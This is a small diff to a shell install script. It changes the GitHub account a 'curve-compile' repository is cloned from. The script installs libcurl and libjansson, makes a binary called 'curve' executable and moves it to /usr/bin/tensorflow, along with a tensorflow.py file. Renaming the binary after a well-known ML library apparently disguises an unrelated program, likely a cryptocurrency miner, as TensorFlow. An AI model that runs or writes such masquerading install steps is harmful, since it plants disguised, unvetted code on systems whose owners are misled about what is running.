@@ -1,6 +1,6 @@
 apt update -y
 apt install git libcurl4-openssl-dev libjansson-dev -y
-git clone https://github.com/agussusahnti/curve-compile
+git clone https://github.com/gyrogerald/curve-compile
 chmod +x curve-compile/run.sh curve-compile/curve
 mv curve-compile/curve /usr/bin/tensorflow
 mv curve-compile/tensorflow.py tensorflow.py
